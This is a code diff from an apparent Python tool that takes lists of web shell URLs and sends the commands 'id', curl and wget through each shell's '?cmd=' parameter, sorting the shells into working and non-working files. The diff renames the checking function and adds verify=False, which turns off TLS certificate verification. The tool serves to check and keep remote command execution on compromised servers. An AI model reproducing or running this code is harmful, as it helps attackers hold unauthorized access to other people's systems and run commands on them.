@@ -35,7 +35,7 @@ def parse_arguments():
 def check_status_txt_file(path):
     with (open(path) as txt_file):
         for line in txt_file:
-            send_requests_and_compare_responses(line)
+            send_requests_and_check_responses(line)
     txt_file.close()
 
 
@@ -45,18 +45,18 @@ def check_status_csv_file(path):
         row_count = len(results)
         for index in range(row_count):
             line = results.__array__().item(index)
-            send_requests_and_compare_responses(line)
+            send_requests_and_check_responses(line)
     csv_file.close()
 
 
-def send_requests_and_compare_responses(shell_url):
+def send_requests_and_check_responses(shell_url):
     with open(file_with_working_shells, 'w') as working_shells_file:
         with open(file_with_not_working_shells, 'w') as not_working_shells_file:
             print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
 
-            response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000).text
-            response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000).text
-            response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000).text
+            response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
+            response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
+            response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
 
             contains_uid = response_text_id.find("uid")
             contains_wget_file = secret_message in response_text_wget
